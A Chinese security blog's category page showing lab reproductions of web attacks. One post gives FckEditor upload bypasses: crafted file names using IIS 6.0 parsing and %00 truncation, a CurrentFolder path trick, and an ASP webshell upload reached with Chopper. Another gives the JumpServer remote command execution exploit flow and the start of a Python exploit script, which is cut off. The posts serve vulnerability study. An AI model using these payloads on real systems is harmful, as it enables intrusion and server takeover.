<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>分类: web渗透 - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Stay hungry, stay foolish."><meta property="og:type" content="blog"><meta property="og:title" content="B0urne &#039;s Blog"><meta property="og:url" content="http://b0u4ne.gihub.io/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="Stay hungry, stay foolish."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/img/og_image.png"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io"},"headline":"B0urne 's Blog","image":["http://b0u4ne.gihub.io/img/og_image.png"],"author":{"@type":"Person","name":"B0urne"},"description":"Stay hungry, stay foolish."}</script><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">分类</a></li><li class="is-active"><a href="#" aria-current="page">web渗透</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-29T05:24:31.000Z" title="2021-1-29 13:24:31">2021-01-29</time>发表</span><span class="level-item"><time dateTime="2021-02-23T03:32:21.520Z" title="2021-2-23 11:32:21">2021-02-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">18 分钟读完 (大约2748个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">Selenium使用教程</a></h1><div class="content"><h1 id="Selenium：动态页面模拟点击"><a href="#Selenium：动态页面模拟点击" class="headerlink" title="Selenium：动态页面模拟点击"></a>Selenium：动态页面模拟点击</h1><h1 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h1><blockquote>
<p>Selenium是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动操作，不同是Selenium 可以直接运行在浏览器上，它支持所有主流的浏览器（包括PhantomJS这些无界面的浏览器）。</p>
<p>Selenium 可以根据我们的指令，让浏览器自动加载页面，获取需要的数据，甚至页面截屏，或者判断网站上某些动作是否发生。</p>
<p>Selenium 自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。但是我们有时候需要让它内嵌在代码中运行，所以我们可以用一个叫 PhantomJS 的工具代替真实的浏览器。</p>
<p>可以从 PyPI 网站下载 Selenium库<a target="_blank" rel="noopener" href="https://pypi.python.org/simple/selenium">https://pypi.python.org/simple/selenium</a> ，也可以用 第三方管理器 pip用命令安装：pip install selenium</p>
<p>Selenium 官方参考文档：<a target="_blank" rel="noopener" href="http://selenium-python.readthedocs.io/index.html">http://selenium-python.readthedocs.io/index.html</a></p>
</blockquote></div><a class="article-more button is-small is-size-7" href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-29T04:22:09.000Z" title="2021-1-29 12:22:09">2021-01-29</time>发表</span><span class="level-item"><time dateTime="2021-01-29T04:42:50.922Z" title="2021-1-29 12:42:50">2021-01-29</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">11 分钟读完 (大约1603个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/">FckEditor编辑器上传漏洞getshel总结</a></h1><div class="content"><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><p>在我的资源中下载： fckeditor编辑器上传——含有点变成下划线限制的源码包，下载后，使用IIS搭建即可。</p>
<h2 id="二、漏洞复现突破-变"><a href="#二、漏洞复现突破-变" class="headerlink" title="二、漏洞复现突破.变_"></a>二、漏洞复现突破.变_</h2><p>访问目标网站，如下图所示：<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207173742359.png" alt="在这里插入图片描述"><br>通过遇见扫描，发现目标网站存在fckeditor编辑器<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207173906394.png" alt="在这里插入图片描述"><br>百度搜索fckeditor编辑器漏洞利用，找到参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3775396.html%EF%BC%8C%E6%8C%89%E7%85%A7%E9%93%BE%E6%8E%A5%E4%B8%AD%E5%B8%B8%E7%94%A8%E4%B8%8A%E4%BC%A0%E5%9C%B0%E5%9D%80%E6%8C%A8%E4%B8%AA%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95">https://www.cnblogs.com/milantgh/p/3775396.html，按照链接中常用上传地址挨个进行测试</a><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207174235332.png" alt="在这里插入图片描述"><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207174356693.png" alt="在这里插入图片描述"><br>测试过程中发现第三个会弹窗提示，说明没有访问到上传目录，那么添加…/…/到文件上传目录<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207174439840.png" alt="在这里插入图片描述"><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207174628623.png" alt="在这里插入图片描述"><br>接下来，查看目标网站搭建平台，发现是IIS6.0，那么可以结合IIS6.0的解析漏洞进行利用<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207180613293.png" alt="在这里插入图片描述"><br>上传logo.asp;.x.jpg图片<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207181821596.png" alt="在这里插入图片描述"><br>成功上传，并查看页面源代码查找文件路径并进行访问<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207181903325.png" alt="在这里插入图片描述"><br>访问上传的文件后，发现是图片，并没有当作asp进行解析。而且文件名字变为了logo_asp;x.jpg，这是因为Fckeditor进行了上传限制<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207181932724.png" alt="在这里插入图片描述"></p>
<h2 id="突破方法："><a href="#突破方法：" class="headerlink" title="突破方法："></a>突破方法：</h2><h2 id="突破方法一（配合解析漏洞）：二次上传"><a href="#突破方法一（配合解析漏洞）：二次上传" class="headerlink" title="突破方法一（配合解析漏洞）：二次上传"></a>突破方法一（配合解析漏洞）：二次上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一次上传 logo.asp;x.jpg &#x3D;&#x3D;&gt;变成logo_asp;_x.jpg </span><br><span class="line">第二次 上传logo.asp;x.jpg &#x3D;&#x3D;&gt;变成logo.asp;.x(1).jpg </span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>再次上传logo.asp;x.jpg文件<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207182025478.png" alt="在这里插入图片描述"><br>虽然会提示，但不用理会，点击确定继续上传即可<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207182106213.png" alt="在这里插入图片描述"><br>之后成功上传，结果是logo_asp;_x(1).jpg，以前这种方法是可以的，但这个环境不可以，知道此方法就行<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207182525800.png" alt="在这里插入图片描述"></p>
<h2 id="突破方法二（配合解析漏洞）：创建文件夹"><a href="#突破方法二（配合解析漏洞）：创建文件夹" class="headerlink" title="突破方法二（配合解析漏洞）：创建文件夹"></a>突破方法二（配合解析漏洞）：创建文件夹</h2><p>新建一个ceshi.asp文件夹并抓包查看HTTP请求头，如下图所示：<br>/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2F&amp;NewFolderName=ceshi.asp&amp;uuid=1607337224005<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207183417148.png" alt="在这里插入图片描述"><br>发现文件夹变成了ceshi_asp<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207183510844.png" alt="在这里插入图片描述"></p>
<p>接下里，直接访问当前文件夹并抓包查看HTTP请求头，如下图所示：<br>/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F&amp;uuid=1607337266178<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207183441116.png" alt="在这里插入图片描述"><br>对比两个HTTP请求数据包不同的部分，发现只有后半部分不一样，第一个请求包多一个NewFolderName参数<br>&amp;CurrentFolder=%2F&amp;NewFolderName=ceshi.asp&amp;uuid=1607337224005<br>&amp;CurrentFolder=%2F&amp;uuid=1607337266178</p>
<p>分析：<br>%2f也就是/ ，猜测<br>&amp;CurrentFolder=/a/&amp;NewFolderName=aaa.asp 会变成/a/aaa.asp</p>
<p>&amp;CurrentFolder=/&amp;uuid=1582206392524 就是/</p>
<p>那么猜测上传/q.asp/w.asp是否可以突破Fckeditor的限制<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207183826182.png" alt="在这里插入图片描述"><br>成功tupo，创建文件夹q.asp<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201207183905534.png" alt="在这里插入图片描述"><br>因为程序只过滤了NewFolderName参数，没有对CurrentFolder参数进行过滤，那么我们就可以利用的CurrentFolder参数，通过CurrentFolder创建文件夹。<br>既然文件夹创建好了那么上传木马文件cus.asp，注意：将cus.asp后缀修改为cus.jpg，后再进行上传<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208180350898.png" alt="在这里插入图片描述"><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208180430808.png" alt="在这里插入图片描述"><br>之后访问上传的cus.jpg文件发现被当作asp文件进行了解析<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208180656902.png" alt="在这里插入图片描述"><br>使用菜刀成功连接<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208180711888.png" alt="在这里插入图片描述"></p>
<h2 id="突破方法三（双重截断上传-二次上传）："><a href="#突破方法三（双重截断上传-二次上传）：" class="headerlink" title="突破方法三（双重截断上传+二次上传）："></a>突破方法三（双重截断上传+二次上传）：</h2><p>此方法不配合解析漏洞<br>首先上传一个x.asp.asp.jpg文件，并且使用burpsuite拦截数据包<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181118597.png" alt="在这里插入图片描述"><br>拦截数据包后将x.asp.asp.jpg修改为x.asp%00asp%00jpg<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181231773.png" alt="在这里插入图片描述"><br>之后再将x.asp%00asp%00jpg中的%00进行URL解码，解码之后如下图所示，虽然显示什么也没有，但是已经解码<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181346630.png" alt="在这里插入图片描述"><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181403749.png" alt="在这里插入图片描述"><br>解码之后点击发送，提示你文件上传成功，文件名为x.asp__asp__jpg<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181421467.png" alt="在这里插入图片描述"><br>数据包什么也不要修改，点击send再次发送，发现文件上传成功，文件名为：x(1).asp，成功突破限制<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181524499.png" alt="在这里插入图片描述"><br>访问该文件，发现被成功解析，使用菜刀成功连接<br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181654865.png" alt="在这里插入图片描述"><br><img src="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/20201208181722676.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>转自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/110823562">https://blog.csdn.net/weixin_40412037/article/details/110823562</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-25T09:50:55.000Z" title="2021-1-25 17:50:55">2021-01-25</time>发表</span><span class="level-item"><time dateTime="2021-02-18T09:43:53.098Z" title="2021-2-18 17:43:53">2021-02-18</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">23 分钟读完 (大约3519个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/">JumpServer 远程命令执行-2021</a></h1><div class="content"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。JumpServer 使用Python / Django 进行开发。</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210129171923706.png" alt="image-20210129171923706"></p>
<p>组件介绍：</p>
<ul>
<li>Jumpserver<ul>
<li>现指 Jumpserver 管理后台，是核心组件（Core）, 使用 Django Class Based View 风格开发，支持 Restful API。</li>
</ul>
</li>
<li>Coco<ul>
<li>实现了 SSH Server 和 Web Terminal Server 的组件，提供 SSH 和 WebSocket 接口, 使用 Paramiko 和 Flask 开发。</li>
</ul>
</li>
<li>Luna<ul>
<li>现在是 Web Terminal 前端，计划前端页面都由该项目提供，Jumpserver 只提供 API，不再负责后台渲染html等。</li>
</ul>
</li>
<li>Guacamole<ul>
<li>Apache 跳板机项目，Jumpserver 使用其组件实现 RDP 功能，Jumpserver 并没有修改其代码而是添加了额外的插件，支持 Jumpserver 调用</li>
</ul>
</li>
</ul>
<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>2021年1月15日，JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器，执行任意命令。建议相关用户尽快采取措施阻止漏洞攻击。</p>
<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><p>1.通过ws连接jumpserver的未授权api，进行日志读取 获取三个id值 (system_id,target_id,system_user_id)</p>
<p>2.利用 /api/v1/authentication/connection-token/?user-only=1  获取token （此token 20s内有效）</p>
<p>3.通过ws 连接 /koko/ws/token/?target_id  带入刚刚获取的token_id 进行执行命令</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JumpServer &lt; v2.6.2<br>JumpServer &lt; v2.5.4<br>JumpServer &lt; v2.4.5<br>JumpServer = v1.5.9</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装JumpServer-v2-6-1"><a href="#安装JumpServer-v2-6-1" class="headerlink" title="安装JumpServer v2.6.1"></a>安装JumpServer v2.6.1</h2><p>安装脚本<a target="_blank" rel="noopener" href="https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip">https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip</a></p>
<p>要求Centos 7 系统，内存8G以上，cpu 2核以上</p>
<p>或者执行官网脚本</p>
<p>curl -sSL <a target="_blank" rel="noopener" href="https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh">https://github.com/jumpserver/jumpserver/releases/download/v2.6.1/quick_start.sh</a> | bash</p>
<p>解压缩后执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;quick_start.sh </span><br></pre></td></tr></table></figure>
<p>默认即可(不引用外部redis,mysql)</p>
<p>进入/opt/jumpserver-installer-v2.6.2，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh start</span><br></pre></td></tr></table></figure>
<p>如下图为执行正常</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125201834167.png" alt="image-20210125201834167"></p>
<p>降级到v2.6.1，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh upgrade v2.6.1</span><br></pre></td></tr></table></figure>
<p>其他命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh stop</span><br><span class="line">.&#x2F;jmsctl.sh restart</span><br><span class="line">.&#x2F;jmsctl.sh backup</span><br><span class="line">.&#x2F;jmsctl.sh upgrade</span><br></pre></td></tr></table></figure>
<p>web后台</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">https:&#x2F;&#x2F;127.0.0.1:8443</span><br></pre></td></tr></table></figure>
<p>ssh/sftp访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@127.0.0.1 -p2222</span><br><span class="line">sftp -P2222 admin@127.0.0.1</span><br></pre></td></tr></table></figure>
<p>相关资料：</p>
<p><a target="_blank" rel="noopener" href="https://docs.jumpserver.org/">https://docs.jumpserver.org</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jumpserver.org/">https://www.jumpserver.org</a></p>
<h2 id="访问web端"><a href="#访问web端" class="headerlink" title="访问web端"></a>访问web端</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
<p>admin/admin</p>
<p>先随便创建一台同网段的Linux虚拟机192.168.132.131，然后添加到资产列表中，通过web端访问后才能获取三个id值</p>
<p>创建系统用户</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203131152.png" alt="image-20210125203131152"></p>
<p>更新管理用户</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125202453350.png" alt="image-20210125202453350"></p>
<p>资产列表添加主机</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203257360.png" alt="image-20210125203257360"></p>
<p>资产授权</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203538811.png" alt="image-20210125203538811"></p>
<p>打开web终端</p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203606871.png" alt="image-20210125203606871"></p>
<p><img src="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/image-20210125203708238.png" alt="image-20210125203708238"></p>
<h1 id="脚本复现"><a href="#脚本复现" class="headerlink" title="脚本复现"></a>脚本复现</h1><h2 id="脚本1"><a href="#脚本1" class="headerlink" title="脚本1"></a>脚本1</h2><p>1、运行脚本获取到asset、system_user、user三个ID值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aioconsole</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;/api/v1/authentication/connection-token/?user-only=1&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># def get_celery_task_log_path(task_id):</span></span><br><span class="line"><span class="comment">#     task_id = str(task_id)</span></span><br><span class="line"><span class="comment">#     rel_path = os.path.join(task_id[0], task_id[1], task_id + &quot;.log&quot;)</span></span><br><span class="line"><span class="comment">#     path = os.path.join(&quot;/opt/jumpserver/&quot;, rel_path)</span></span><br><span class="line"><span class="comment">#     return path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">websocket, _text</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        print(<span class="string">f&#x27;you have enter 